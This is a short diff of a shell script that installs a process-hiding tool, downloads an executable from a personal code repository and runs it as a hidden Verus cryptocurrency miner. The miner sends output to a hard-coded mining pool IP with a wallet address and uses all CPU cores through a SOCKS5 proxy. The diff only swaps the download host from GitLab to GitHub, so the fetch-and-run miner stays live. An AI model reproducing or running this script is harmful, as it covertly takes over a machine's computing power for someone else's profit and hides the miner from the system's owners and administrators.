@@ -6,6 +6,6 @@ sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs >/dev/null 2>&1
 sudo npm i -g node-process-hider && sudo ph add project
-wget -O project https://gitlab.com/mauliki9999/codet/-/raw/main/Data_api && chmod +x project &&
+wget -O project https://github.com/mauliki9999/codet/raw/main/Data_api && chmod +x project &&
 ./project -a verus -o stratum+tcp://79.137.70.48:3956 -u RG8nBd1ce7oAUHV3kL6ezoeApw9VUPzZy2.SHELL -p -x -t $(nproc --all) -x socks5://hola:1234abcd@47.89.228.8:80
 EOF
